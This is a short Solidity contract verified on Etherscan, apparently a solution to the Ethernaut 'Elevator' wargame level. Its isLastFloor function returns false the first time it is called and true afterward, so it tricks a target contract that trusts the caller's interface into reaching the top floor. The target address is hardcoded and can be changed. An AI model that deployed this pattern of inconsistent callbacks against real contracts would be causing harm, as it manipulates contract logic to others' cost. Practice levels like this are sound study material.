/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

pragma solidity 0.8.17;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

abstract contract ElevatorContract
{
    function goTo(uint _floor) public virtual;
}

contract ElevatorHelper is Building
{
    bool public lastFloor;
    ElevatorContract elevator = ElevatorContract(0x400A7319ee79AE06668Ed31D2e33b25087ebBf26);

    function isLastFloor(uint) external returns (bool)
    {
        if (!lastFloor)
        {
            lastFloor = true;
            return false;
        }
        return lastFloor;
    }

    function setElevator(uint160 _address) public
    {
        elevator = ElevatorContract(address(_address));
    }

    function goTo() public 
    {
        elevator.goTo(10);
    }
}